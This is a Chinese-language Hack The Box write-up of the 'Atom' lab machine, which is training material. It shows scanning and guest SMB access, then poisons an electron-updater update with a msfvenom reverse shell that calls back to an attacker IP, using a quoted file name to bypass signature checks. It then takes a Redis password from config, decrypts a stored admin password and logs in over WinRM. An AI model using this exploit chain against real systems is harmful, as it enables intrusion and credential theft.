---
title: HTB-Atom Writeup
date: 2026-09-29T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Windows
  - Writeup
  - HTB
  - SMB
  - Shadow_Credentials
---
## Nmap 扫描

使用 Nmap 进行端口扫描。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Atom]
└─$ sudo nmap --min-rate 10000 -p- 10.129.46.59 -oA Nmap/ports
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-28 04:01 -0400
Nmap scan report for 10.129.46.59
Host is up (0.34s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
443/tcp  open  https
445/tcp  open  microsoft-ds
5985/tcp open  wsman
6379/tcp open  redis

Nmap done: 1 IP address (1 host up) scanned in 16.26 seconds
┌──(kali㉿kali)-[~/Work/Kali/Atom]
└─$ grep open Nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
80,135,443,445,5985,6379
```

对开放的端口进行详细信息扫描。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Atom]
└─$ sudo nmap -sT -sV -sC -O -p80,135,443,445,5985,6379 10.129.46.59 -oA Nmap/detail
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-28 04:06 -0400
Nmap scan report for 10.129.46.59
Host is up (0.11s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: Heed Solutions
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
135/tcp  open  msrpc        Microsoft Windows RPC
443/tcp  open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-methods:
|_  Potentially risky methods: TRACE
| tls-alpn:
|_  http/1.1
|_http-title: Heed Solutions
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6379/tcp open  redis        Redis key-value store
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (97%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Windows Server 2019 (91%), Microsoft Windows 10 1803 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h19m03s, deviation: 4h02m31s, median: -57s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2026-09-28T08:05:50
|_  start_date: N/A
| smb-os-discovery:
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: ATOM
|   NetBIOS computer name: ATOM\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-09-28T01:05:53-07:00
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.96 seconds
```

## SMB 探索

使用空账号密码尝试对 smb 进行枚举被拒绝。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Atom]
└─$ nxc smb 10.129.46.59 -u '' -p '' --shares
SMB         10.129.46.59    445    ATOM             [*] Windows 10 Pro 19042 x64 (name:ATOM) (domain:ATOM) (signing:False) (SMBv1:True)
SMB         10.129.46.59    445    ATOM             [-] ATOM\: STATUS_ACCESS_DENIED
SMB         10.129.46.59    445    ATOM             [-] Error enumerating shares: Error occurs while reading from remote(104)
```

使用任意用户名对 smb 进行枚举，发现 `Software_Updates` 共享匿名读写。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Atom]
└─$ nxc smb 10.129.46.59 -u 'enil' -p '' --shares
SMB         10.129.46.59    445    ATOM             [*] Windows 10 Pro 19042 x64 (name:ATOM) (domain:ATOM) (signing:False) (SMBv1:True)
SMB         10.129.46.59    445    ATOM             [+] ATOM\enil: (Guest)
SMB         10.129.46.59    445    ATOM             [*] Enumerated shares
SMB         10.129.46.59    445    ATOM             Share           Permissions     Remark
SMB         10.129.46.59    445    ATOM             -----           -----------     ------
SMB         10.129.46.59    445    ATOM             ADMIN$                          Remote Admin
SMB         10.129.46.59    445    ATOM             C$                              Default share
SMB         10.129.46.59    445    ATOM             IPC$            READ            Remote IPC
SMB         10.129.46.59    445    ATOM             Software_Updates READ,WRITE
```

连接 `Software_Updates`，里面有三个 `client` 文件夹和一个 PDF。

将 PDF 下载下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Atom]
└─$ smbclient //10.129.46.59/Software_Updates -U enil -N
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> recurse on
smb: \> ls
  .                                   D        0  Mon Sep 28 04:25:37 2026
  ..                                  D        0  Mon Sep 28 04:25:37 2026
  client1                             D        0  Mon Sep 28 04:25:37 2026
  client2                             D        0  Mon Sep 28 04:25:37 2026
  client3                             D        0  Mon Sep 28 04:25:37 2026
  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 07:18:08 2021

\client1
  .                                   D        0  Mon Sep 28 04:25:37 2026
  ..                                  D        0  Mon Sep 28 04:25:37 2026

\client2
  .                                   D        0  Mon Sep 28 04:25:37 2026
  ..                                  D        0  Mon Sep 28 04:25:37 2026

\client3
  .                                   D        0  Mon Sep 28 04:25:37 2026
  ..                                  D        0  Mon Sep 28 04:25:37 2026

		4413951 blocks of size 4096. 1369826 blocks available
smb: \> mget UAT_Testing_Procedures.pdf
getting file \UAT_Testing_Procedures.pdf of size 35202 as UAT_Testing_Procedures.pdf (58.5 KiloBytes/sec) (average 58.5 KiloBytes/sec)
smb: \> ^C
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Atom]
└─$ file UAT_Testing_Procedures.pdf
UAT_Testing_Procedures.pdf: PDF document, version 1.3, 2 page(s)
```

下面是 PDF 的内容。

```bash
Heedv1.0
Internal QA Documentation
What is Heed ?
Note taking application built with electron-builder which helps users in taking important
notes.
Features ?
Very limited at the moment. There’s no server interaction when creating notes. So
currently it just acts as a one-tier thick client application. We are planning to move it to a
full fledged two-tier architecture sometime in the future releases.
What about QA ?
We follow the below process before releasing our products.
1. Build and install the application to make sure it works as we expect it to be.
2. Make sure that the update server running is in a private hardened instance. To
initiate the QA process, just place the updates in one of the "client" folders, and]\
the appropriate QA team will test it to ensure it finds an update and installs it
correctly.
3. Follow the checklist to see if all given features are working as expected by the
developer.
1
```

Heed 是个 Electron 应用，用 electron-builder 打包。electron-builder 自带的更新机制是 **electron-updater**，它的工作方式是：**从服务器拉 `latest.yml` → 按里面的 sha512 校验并下载安装包 → 静默执行该安装包**。

目标机的 Heed 客户端**会自己去某个更新源轮询、发现新版本、自动下载并安装**。而文档明说触发方式就是"往 client 文件夹里放东西"。

更新服务器的位置和形态未知，需要探测。

`Software_Updates` 共享 **Guest 可写**，且 Heed 客户端会**自动发现并安装**放进"client 文件夹"的更新。

访问 web 80 端口发现下载入口，下载下来放到工作目录。

![](Pasted%20image%2020260929103909.png)

```bash
┌──(kali㉿kali)-[~/Work/Kali/Atom]
└─$ file heed_setup_v1.0.0.zip
heed_setup_v1.0.0.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
```

解压。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Atom]
└─$ unzip heed_setup_v1.0.0.zip
Archive:  heed_setup_v1.0.0.zip
  inflating: heedv1 Setup 1.0.0.exe
UAT_Testing_Procedures.pdf
┌──(kali㉿kali)-[~/Work/Kali/Atom]
└─$ ls -liah heedv1\ Setup\ 1.0.0.exe
4347637 -rw-rw-r-- 1 kali kali 45M Apr  9  2021 'heedv1 Setup 1.0.0.exe'

```

## exe 探索

用 `7z x` 解包并保留目录结构，并输出到 `ext` 文件夹。

在 `ext` 文件夹中对每个找到的文件执行一次命令，并输出到 `ext2`。

读取 `ext2` 中的内容，找到内容：
1. 更新源类型为 `generic`
2. 客户端去 `http://updates.atom.htb` 取 `lastest.yml`
3. Windows 下校验下载到的安装包签名适用的名字

```bash
┌──(kali㉿kali)-[~/Work/Kali/Atom]
└─$ 7z x "heedv1 Setup 1.0.0.exe" -oext -y >/dev/null

                                                                                                                                            
┌──(kali㉿kali)-[~/Work/Kali/Atom]
└─$ find ext -name '*.7z' -exec 7z x {} -oext2 -y \; >/dev/null
                                                                                                                                            
┌──(kali㉿kali)-[~/Work/Kali/Atom]
└─$ cat "$(find ext2 -iname app-update.yml | head -1)"
provider: generic
url: 'http://updates.atom.htb'
publisherName:
  - HackTheBox
```

用 msfvenom 生成反弹 shell，文件名里带一个单引号，让 `electron-updater` 的签名校验出错放行。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Atom/payload]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.151 LPORT=4444 -f exe -o "up'date.exe"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: up'date.exe
```

sha512 需要以 base64 形式写进更新清单。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Atom/payload]
└─$ HASH=$(shasum -a 512 "up'date.exe" | cut -d' ' -f1 | xxd -r -p | base64 -w0); echo "$HASH"
dPDVURoEfy4iSQ6Afu/FpXS3EiTABMV8/zIlvteL92936r3z9Dsqv8BntbJ7o51T8M62gbCbKpQrmur/c+aDjA==
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Atom/payload]
└─$ cat latest.yml
version: 1.0.1
path: up'date.exe
sha512: dPDVURoEfy4iSQ6Afu/FpXS3EiTABMV8/zIlvteL92936r3z9Dsqv8BntbJ7o51T8M62gbCbKpQrmur/c+aDjA==
```

将清单和 payload 放进 `client1`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Atom/payload]
└─$ smbclient //10.129.46.112/Software_Updates -U enil -N 
Try "help" to get a list of possible commands.
smb: \> cd client
client1\  client2\  client3\  
smb: \> cd client1
smb: \client1\> put up'date.exe
putting file up'date.exe as \client1\up'date.exe (23.1 kB/s) (average 23.1 kB/s)
smb: \client1\> put latest.yml
putting file latest.yml as \client1\latest.yml (0.4 kB/s) (average 11.7 kB/s)
smb: \client1\> ls
  .                                   D        0  Mon Sep 28 23:32:09 2026
  ..                                  D        0  Mon Sep 28 23:32:09 2026
  latest.yml                          A      130  Mon Sep 28 23:32:09 2026
  up'date.exe                         A     7680  Mon Sep 28 23:31:58 2026

                4413951 blocks of size 4096. 1372304 blocks available

```

监听 4444 端口，拿到回连，是 `atom\jason`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Atom]
└─$ sudo rlwrap nc -lvnp 4444 

[sudo] password for kali: 
listening on [any] 4444 ...
connect to [10.10.16.151] from (UNKNOWN) [10.129.46.112] 59880
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
atom\jason
```

## 提权

枚举发现 redis 的目录。

```bash
C:\Program Files\Redis>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9793-C2E6

 Directory of C:\Program Files\Redis

09/28/2026  06:47 PM    <DIR>          .
09/28/2026  06:47 PM    <DIR>          ..
07/01/2016  03:54 PM             1,024 EventLog.dll
04/02/2021  07:31 AM    <DIR>          Logs
07/01/2016  03:52 PM            12,618 Redis on Windows Release Notes.docx
07/01/2016  03:52 PM            16,769 Redis on Windows.docx
07/01/2016  03:55 PM           406,016 redis-benchmark.exe
07/01/2016  03:55 PM         4,370,432 redis-benchmark.pdb
07/01/2016  03:55 PM           257,024 redis-check-aof.exe
07/01/2016  03:55 PM         3,518,464 redis-check-aof.pdb
07/01/2016  03:55 PM           268,288 redis-check-dump.exe
07/01/2016  03:55 PM         3,485,696 redis-check-dump.pdb
07/01/2016  03:55 PM           482,304 redis-cli.exe
07/01/2016  03:55 PM         4,517,888 redis-cli.pdb
07/01/2016  03:55 PM         1,553,408 redis-server.exe
07/01/2016  03:55 PM         6,909,952 redis-server.pdb
04/02/2021  07:39 AM            43,962 redis.windows-service.conf
04/02/2021  07:37 AM            43,960 redis.windows.conf
07/01/2016  09:17 AM            14,265 Windows Service Documentation.docx
              16 File(s)     25,902,070 bytes
               3 Dir(s)   5,618,987,008 bytes free
```

```bash
C:\Program Files\Redis>type redis.windows.conf

################################## SECURITY ###################################                                             01:58 [560/1880]
                                                                                                                                            
# Require clients to issue AUTH <PASSWORD> before processing any other                                                                      
# commands.  This might be useful in environments in which you do not trust                                                                 
# others with access to the host running redis-server.                                                                                      
#                                                                                                                                           
# This should stay commented out for backward compatibility and because most                                                                
# people do not need auth (e.g. they run their own servers).                                                                                
#                                                                                                                                           
# Warning: since Redis is pretty fast an outside user can try up to                                                                         
# 150k passwords per second against a good box. This means that you should                                                                  
# use a very strong password otherwise it will be very easy to break.                                                                       
#                                                                                                                                           
# requirepass foobared                                                                                                                      

# Command renaming.
#
# It is possible to change the name of dangerous commands in a shared
# environment. For instance the CONFIG command may be renamed into something
# hard to guess so that it will still be available for internal-use tools
# but not available for general clients.
#
# Example:
#
# rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52
#
# It is also possible to completely kill a command by renaming it into
# an empty string:
#
# rename-command CONFIG ""
#
# Please note that changing the name of commands that are logged into the
# AOF file or transmitted to slaves may cause problems.

```

`sc qc Redis` 发现服务实际加载的是 `C:\Program Files\Redis\redis.windows-service.conf`，继续查找发现密码是 `kidvscat_yes_kidvscat`。

```bash
C:\Program Files\Redis>sc qc Redis
sc qc Redis
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Redis
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Redis\redis-server.exe" --service-run "C:\Program Files\Redis\redis.windows-service.conf"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Redis
        DEPENDENCIES       : 
        SERVICE_START_NAME : NT AUTHORITY\NETWORKSERVICE

C:\Program Files\Redis>findstr /n /i "requirepass" "C:\Program Files\Redis\redis.windows.conf" "C:\Program Files\Redis\redis.windows-service.conf"
findstr /n /i "requirepass" "C:\Program Files\Redis\redis.windows.conf" "C:\Program Files\Redis\redis.windows-service.conf"
C:\Program Files\Redis\redis.windows.conf:2:requirepass kidvscat_yes_kidvscat
C:\Program Files\Redis\redis.windows.conf:202:# If the master is password protected (using the "requirepass" configuration
C:\Program Files\Redis\redis.windows.conf:386:# requirepass foobared
C:\Program Files\Redis\redis.windows-service.conf:2:requirepass kidvscat_yes_kidvscat
C:\Program Files\Redis\redis.windows-service.conf:202:# If the master is password protected (using the "requirepass" configuration
C:\Program Files\Redis\redis.windows-service.conf:386:# requirepass foobared
```

验证密码是正确的。

```bash
C:\Program Files\Redis>"C:\Program Files\Redis\redis-cli.exe" -a kidvscat_yes_kidvscat PING
"C:\Program Files\Redis\redis-cli.exe" -a kidvscat_yes_kidvscat PING
PONG
```

读取里面的数据。

```bash
C:\Program Files\Redis>"C:\Program Files\Redis\redis-cli.exe" -a kidvscat_yes_kidvscat GET "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"
"C:\Program Files\Redis\redis-cli.exe" -a kidvscat_yes_kidvscat GET "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"
{"Id":"e8e29158d70d44b1a1ba4949d52790a0","Name":"Administrator","Initials":"","Email":"","EncryptedPassword":"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi","Role":"Admin","Inactive":false,"TimeStamp":637530169606440253}
```

使用 openssl 解密，得到 administrator 的密码。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Atom/payload]
└─$ echo "Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi" | base64 -d | openssl enc -d -des-cbc -K 376c7936557a6e4a -iv 587556556d356652 -provider legacy -provider default; echo
kidvscat_admin_@123
```

登陆拿到 administrator。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Atom/payload]
└─$ evil-winrm -i 10.129.46.112 -u Administrator -p 'kidvscat_admin_@123'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
atom\administrator
```
